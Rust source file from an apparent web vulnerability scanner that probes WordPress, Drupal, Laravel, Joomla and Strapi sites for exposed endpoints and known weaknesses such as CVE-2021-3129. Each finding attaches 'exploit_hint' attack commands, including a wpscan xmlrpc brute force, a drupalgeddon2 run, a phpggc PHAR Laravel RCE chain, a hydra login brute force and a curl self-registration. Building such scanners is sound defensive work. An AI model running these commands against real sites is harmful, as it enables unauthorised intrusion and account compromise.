//! Technology-specific vulnerability probes.
//!
//! Once `techstack` fingerprints the CMS/framework, these probes run
//! targeted checks that only make sense for that specific technology.
//!
//! WordPress  → user enumeration (REST), xmlrpc.php, debug.log
//! Drupal     → CHANGELOG.txt version, update.php exposure
//! Laravel    → Ignition debug/RCE (CVE-2021-3129)
//! Joomla     → /administrator/ panel exposure
//! Strapi     → open registration, admin UI

use gossan_core::{Target, WebAssetTarget};
use reqwest::Client;
use secfinding::{Evidence, Finding, Severity};

pub async fn probe(client: &Client, asset: &WebAssetTarget, target: &Target) -> Vec<Finding> {
    let mut findings = Vec::new();
    let base = asset.url.as_str().trim_end_matches('/');

    for tech in &asset.tech {
        let f = match tech.name.as_str() {
            "WordPress" => wordpress(client, base, target).await,
            "Drupal" => drupal(client, base, target).await,
            "Laravel" => laravel(client, base, target).await,
            "Joomla" => joomla(client, base, target).await,
            "Strapi" => strapi(client, base, target).await,
            _ => vec![],
        };
        findings.extend(f);
    }

    findings
}

// ── WordPress ─────────────────────────────────────────────────────────────────

async fn wordpress(client: &Client, base: &str, target: &Target) -> Vec<Finding> {
    let mut f = Vec::new();

    // User enumeration via REST API — leaks usernames for brute force
    let url = format!("{}/wp-json/wp/v2/users", base);
    if let Ok(resp) = client.get(&url).send().await {
        if resp.status().as_u16() == 200 {
            let body = resp.text().await.unwrap_or_default();
            if body.contains("\"id\"") && body.contains("\"slug\"") {
                f.push(
                    crate::finding_builder(
                        target,
                        Severity::High,
                        "WordPress user enumeration via REST API",
                        format!(
                            "{} exposes user accounts (IDs, names, slugs). \
                                 Attackers use these to craft targeted brute force attacks.",
                            url
                        ),
                    )
                    .evidence(Evidence::HttpResponse {
                        status: 200,
                        headers: vec![],
                        body_excerpt: Some(body.chars().take(400).collect()),
                    })
                    .tag("wordpress")
                    .tag("user-enum")
                    .tag("exposure")
                    .exploit_hint(format!(
                        "curl -s '{}/wp-json/wp/v2/users' | jq '.[].{{id,name,slug}}'",
                        base
                    ))
                    .build()
                    .expect("finding builder: required fields are set"),
                );
            }
        }
    }

    // XML-RPC: brute force amplification via system.multicall
    let xmlrpc_url = format!("{}/xmlrpc.php", base);
    if let Ok(resp) = client.get(&xmlrpc_url).send().await {
        let status = resp.status().as_u16();
        if status == 200 || status == 405 {
            let body = resp.text().await.unwrap_or_default();
            if body.contains("XML-RPC") || body.contains("xmlrpc") || status == 405 {
                f.push(
                    crate::finding_builder(
                        target,
                        Severity::Medium,
                        "WordPress XML-RPC enabled",
                        format!(
                            "{} is accessible. system.multicall lets attackers test \
                                 hundreds of passwords per request, completely bypassing \
                                 rate-limiting and account lockout controls.",
                            xmlrpc_url
                        ),
                    )
                    .evidence(Evidence::HttpResponse {
                        status,
                        headers: vec![],
                        body_excerpt: None,
                    })
                    .tag("wordpress")
                    .tag("xmlrpc")
                    .tag("brute-force")
                    .exploit_hint(format!(
                        "# WPScan multicall brute force (no lockout):\n\
                         wpscan --url {} --passwords wordlist.txt --xmlrpc-brute-force",
                        base
                    ))
                    .build()
                    .expect("finding builder: required fields are set"),
                );
            }
        }
    }

    // Debug log often left behind after troubleshooting
    let debug_url = format!("{}/wp-content/debug.log", base);
    if let Ok(resp) = client.get(&debug_url).send().await {
        if resp.status().as_u16() == 200 {
            let body = resp.text().await.unwrap_or_default();
            if (body.contains("PHP") || body.contains("WordPress") || body.contains("Fatal"))
                && body.len() > 50
            {
                f.push(
                    crate::finding_builder(
                        target,
                        Severity::High,
                        "WordPress debug.log publicly readable",
                        format!(
                            "{} leaks PHP errors, internal paths, plugin names, \
                                 and sometimes credentials or API keys.",
                            debug_url
                        ),
                    )
                    .evidence(Evidence::HttpResponse {
                        status: 200,
                        headers: vec![],
                        body_excerpt: Some(body.chars().take(300).collect()),
                    })
                    .tag("wordpress")
                    .tag("log-exposure")
                    .tag("exposure")
                    .build()
                    .expect("finding builder: required fields are set"),
                );
            }
        }
    }

    f
}

// ── Drupal ────────────────────────────────────────────────────────────────────

async fn drupal(client: &Client, base: &str, target: &Target) -> Vec<Finding> {
    let mut f = Vec::new();

    // CHANGELOG.txt reveals exact Drupal version
    let url = format!("{}/CHANGELOG.txt", base);
    if let Ok(resp) = client.get(&url).send().await {
        if resp.status().as_u16() == 200 {
            let body = resp.text().await.unwrap_or_default();
            if body.contains("Drupal") {
                let version = body
                    .lines()
                    .find(|l| l.trim().starts_with("Drupal"))
                    .map(|l| l.trim().to_string())
                    .unwrap_or_else(|| "Drupal (version unknown)".into());
                f.push(
                    crate::finding_builder(target, Severity::Medium,
                        "Drupal version disclosure via CHANGELOG.txt",
                        format!("CHANGELOG.txt reveals exact Drupal version: \"{}\". \
                                 Enables targeted CVE exploitation — Drupalgeddon2 (SA-CORE-2018-002, \
                                 CVSS 9.8) affects versions < 8.5.1.", version))
                    .evidence(Evidence::HttpResponse {
                        status: 200, headers: vec![],
                        body_excerpt: Some(body.chars().take(200).collect()),
                    })
                    .tag("drupal").tag("version-disclosure").tag("exposure")
                    .exploit_hint(format!(
                        "# Drupalgeddon2 (< 8.5.1 / < 7.58):\n\
                         python3 drupalgeddon2.py -u {}", base))
                    .build().expect("finding builder: required fields are set")
                );
            }
        }
    }

    // update.php accessible to anonymous users
    let update_url = format!("{}/update.php", base);
    if let Ok(resp) = client.get(&update_url).send().await {
        if resp.status().as_u16() == 200 {
            let body = resp.text().await.unwrap_or_default();
            if body.contains("Drupal") || body.contains("database update") {
                f.push(
                    crate::finding_builder(
                        target,
                        Severity::High,
                        "Drupal update.php exposed",
                        format!(
                            "{} is publicly accessible. Running database updates \
                                 via the web interface can corrupt data or expose the \
                                 install to privilege escalation.",
                            update_url
                        ),
                    )
                    .evidence(Evidence::HttpResponse {
                        status: 200,
                        headers: vec![],
                        body_excerpt: None,
                    })
                    .tag("drupal")
                    .tag("exposure")
                    .build()
                    .expect("finding builder: required fields are set"),
                );
            }
        }
    }

    f
}

// ── Laravel ───────────────────────────────────────────────────────────────────

async fn laravel(client: &Client, base: &str, target: &Target) -> Vec<Finding> {
    let mut f = Vec::new();

    // Ignition health-check — if exposed, RCE likely available (CVE-2021-3129)
    let url = format!("{}/_ignition/health-check", base);
    if let Ok(resp) = client.get(&url).send().await {
        if resp.status().as_u16() == 200 {
            let body = resp.text().await.unwrap_or_default();
            if body.contains("can_execute_commands") || body.contains("ignition") {
                let can_exec = body.contains("\"can_execute_commands\":true");
                let sev = if can_exec {
                    Severity::Critical
                } else {
                    Severity::High
                };
                f.push(
                    crate::finding_builder(target, sev,
                        if can_exec {
                            "Laravel Ignition RCE — CVE-2021-3129 (can_execute_commands:true)"
                        } else {
                            "Laravel Ignition debug endpoint exposed (CVE-2021-3129)"
                        },
                        format!("{}/_ignition/ debug endpoint is accessible{}. \
                                 CVE-2021-3129 achieves unauthenticated RCE via PHAR deserialization \
                                 through the make-view-variable solution endpoint. CVSS 9.8.", base,
                                if can_exec { " with shell execution enabled" } else { "" }))
                    .evidence(Evidence::HttpResponse {
                        status: 200, headers: vec![],
                        body_excerpt: Some(body.chars().take(300).collect()),
                    })
                    .tag("laravel").tag("rce").tag("cve-2021-3129")
                    .exploit_hint(format!(
                        "# CVE-2021-3129 — PHAR deserialization RCE:\n\
                         git clone https://github.com/ambionics/laravel-exploits\n\
                         php -d phar.readonly=0 phpggc Laravel/RCE5 'id' --phar phar -o /tmp/rce.phar\n\
                         python3 laravel-exploits/laravel-ignition-rce.py {} /tmp/rce.phar", base))
                    .build().expect("finding builder: required fields are set")
                );
            }
        }
    }

    f
}

// ── Joomla ────────────────────────────────────────────────────────────────────

async fn joomla(client: &Client, base: &str, target: &Target) -> Vec<Finding> {
    let mut f = Vec::new();

    let admin_url = format!("{}/administrator/", base);
    if let Ok(resp) = client.get(&admin_url).send().await {
        if resp.status().as_u16() == 200 {
            let body = resp.text().await.unwrap_or_default();
            if body.contains("Joomla") || body.contains("mod-login") {
                f.push(
                    crate::finding_builder(target, Severity::Medium,
                        "Joomla administrator panel exposed",
                        format!("{} is publicly accessible. The Joomla admin \
                                 backend is exposed to credential brute force and \
                                 known auth bypass CVEs.", admin_url))
                    .evidence(Evidence::HttpResponse {
                        status: 200, headers: vec![], body_excerpt: None,
                    })
                    .tag("joomla").tag("admin-panel").tag("exposure")
                    .exploit_hint(format!(
                        "hydra -L users.txt -P passwords.txt {} http-post-form \
                         '/administrator/index.php:username=^USER^&passwd=^PASS^&task=login:F=Invalid'",
                        base))
                    .build().expect("finding builder: required fields are set")
                );
            }
        }
    }

    f
}

// ── Strapi ────────────────────────────────────────────────────────────────────

async fn strapi(client: &Client, base: &str, target: &Target) -> Vec<Finding> {
    let mut f = Vec::new();

    // Admin UI exposed
    let admin_url = format!("{}/admin", base);
    if let Ok(resp) = client.get(&admin_url).send().await {
        if resp.status().as_u16() == 200 {
            let body = resp.text().await.unwrap_or_default();
            if body.contains("strapi") || body.contains("Strapi") {
                f.push(
                    crate::finding_builder(
                        target,
                        Severity::Medium,
                        "Strapi admin panel accessible",
                        format!(
                            "{} admin UI is reachable. If initial setup was never completed, \
                                 an attacker can register the first super-admin account.",
                            admin_url
                        ),
                    )
                    .evidence(Evidence::HttpResponse {
                        status: 200,
                        headers: vec![],
                        body_excerpt: None,
                    })
                    .tag("strapi")
                    .tag("admin-panel")
                    .tag("exposure")
                    .build()
                    .expect("finding builder: required fields are set"),
                );
            }
        }
    }

    // Open self-registration endpoint (v4 path)
    let reg_url = format!("{}/api/auth/local/register", base);
    if let Ok(resp) = client
        .post(&reg_url)
        .header("content-type", "application/json")
        .body(r#"{"username":"gossan-probe","email":"probe@invalid.test","password":"!Probe99"}"#)
        .send()
        .await
    {
        if resp.status().as_u16() == 200 {
            f.push(
                crate::finding_builder(target, Severity::High,
                    "Strapi open user registration enabled",
                    format!("{} accepts new user signups without restriction. \
                             Attackers can self-register to gain authenticated API access \
                             and explore protected endpoints.", reg_url))
                .evidence(Evidence::HttpResponse {
                    status: 200, headers: vec![], body_excerpt: None,
                })
                .tag("strapi").tag("auth-bypass").tag("exposure")
                .exploit_hint(format!(
                    "curl -s -X POST '{}' -H 'Content-Type: application/json' \\\n  \
                     -d '{{\"username\":\"attacker\",\"email\":\"a@evil.com\",\"password\":\"P@ssw0rd!\"}}' \\\n  \
                     | jq .jwt", reg_url))
                .build().expect("finding builder: required fields are set")
            );
        }
    }

    f
}
